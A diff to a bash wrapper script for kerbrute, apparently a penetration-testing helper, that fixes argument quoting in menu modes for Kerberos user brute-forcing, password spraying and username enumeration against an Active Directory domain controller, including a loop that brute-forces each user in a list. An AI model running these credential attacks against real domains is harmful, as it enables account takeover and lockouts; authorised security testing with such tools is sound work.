@@ -18,11 +18,10 @@ then
 	echo -e "\nEnter the file path for the password wordlist:\n"
 	read passwd
 	echo -e "\nEnter the username to Bruteforce\n"
-	read username
-	user="'"; user+=$username; user+="'"
+	read user
 
 	set -x
-	kerbrute bruteuser -d $dom --dc $dc $passwd $user
+	kerbrute bruteuser -d $dom --dc $dc "$passwd" "$user"
 	set +x
 
 elif [ $mode == 2 ]
@@ -31,19 +30,19 @@ then
 	read passwd
 
 	set -x
-	kerbrute bruteforce -d $dom --dc $dc $passwd
+	kerbrute bruteforce -d $dom --dc $dc "$passwd"
 	set +x
 
 elif [ $mode == 3 ]
 then
 	echo -e "\nSpecify the password to spray:\n"
 	read passwd
-	cred="'"; cred+="$passwd"; cred+="'"
+
 	echo -e "\nSpecify the file path to the username wordlist:\n"
 	read user
 
 	set -x
-	kerbrute passwordspray -d $dom --dc $dc $user $cred
+	kerbrute passwordspray -d $dom --dc $dc "$user" "$passwd"
 	set +x
 
 elif [ $mode == 4 ]
@@ -52,7 +51,7 @@ then
 	read user
 
 	set -x
-	kerbrute userenum -d $dom --dc $dc $user
+	kerbrute userenum -d $dom --dc $dc "$user"
 	set +x
 
 elif [ $mode == 5 ]
@@ -64,10 +63,9 @@ then
 
 	for u in $(cat $user_list)
 	do
-		user="'"; user+=$u; user+="'"
 
 		set -x
-		kerbrute bruteuser -d $dom --dc $dc $passwd $user
+		kerbrute bruteuser -d $dom --dc $dc "$passwd" "$u"
 		set +x
 		echo -e "$line"
 	done
